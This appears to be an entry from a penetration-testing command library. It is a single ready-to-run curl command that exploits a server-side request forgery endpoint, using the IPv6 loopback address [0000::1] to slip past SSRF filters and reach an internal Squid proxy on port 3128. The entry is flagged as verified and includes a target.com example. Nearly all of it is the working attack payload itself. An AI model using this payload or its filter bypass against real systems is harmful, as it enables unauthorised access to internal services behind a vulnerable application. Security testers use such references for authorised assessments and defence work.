---
type: command
executor: bash
data: 'curl "http://$_TARGET_APP/ssrf?url=http://[0000::1]:3128/"'
output: null
platforms:
  - Web
tags:
  - ssrf
  - ipv6
  - proxy
verified: true
validated: true
---

# access-internal-squid-via-ssrf-ipv6-loopback

## Command

```bash
curl "http://$_TARGET_APP/ssrf?url=http://[0000::1]:3128/"
```

## Description

Access internal Squid proxy via IPv6 loopback SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_APP | Vulnerable app URL | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/ssrf?url=http://[0000::1]:3128/"
```

## Expected Output

Proxy response or identification.

## Related

- [[procedures/Bypass-SSRF-Filters-with-IPv6-Loopback-Addresses]]
